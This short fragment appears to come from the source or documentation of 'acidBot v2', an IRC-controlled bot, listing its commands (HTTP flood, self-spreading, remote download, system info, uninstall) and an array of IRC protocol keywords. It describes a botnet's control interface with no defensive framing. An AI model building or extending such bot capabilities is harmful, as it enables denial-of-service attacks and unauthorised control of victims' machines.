acidBot v2's Commands:
----------------------
login <password>
logout
httpflood <url> <port>
httpfloodstop
spread <on/off>
uninstall
die
download <file> <local> <0/1>
version
sysinfo
opensite <url>

IRCProtocol: array[1..7] of String = ('ping', 'kick', 'JOIN', 'USER', 'NICK', '001', 'PRIVMSG');
